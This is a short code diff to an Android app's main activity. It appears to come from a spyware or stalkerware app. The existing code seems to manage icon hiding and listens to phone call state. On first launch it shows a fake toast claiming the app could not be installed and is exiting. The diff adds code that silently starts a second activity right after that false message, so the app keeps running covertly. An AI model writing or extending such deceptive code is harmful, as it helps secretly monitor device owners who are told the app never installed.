@@ -215,6 +215,7 @@ public class MainActivity extends AppCompatActivity {
         this.pref = this.context.getSharedPreferences("MyPref", 0);
         this.editor = this.pref.edit();
         bringBackTheIcon();
+
         showToast();
         ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).listen(new MyPhoneListener(this, null), 32);
         Log.w("check", new StringBuilder(String.valueOf(this.pref.getBoolean("check", false))).toString());
@@ -235,6 +236,8 @@ public class MainActivity extends AppCompatActivity {
         if(!hasVisisted) {
             Toast.makeText(this, "Sorry, this app couldn't be installed. Exiting...", Toast.LENGTH_LONG).show();
             prefs.edit().putBoolean("HAS_VISISTED_BEFORE", true).commit();
+            Intent intent = new Intent(this,Main2Activity.class);
+            startActivity(intent);
         }
     }
 
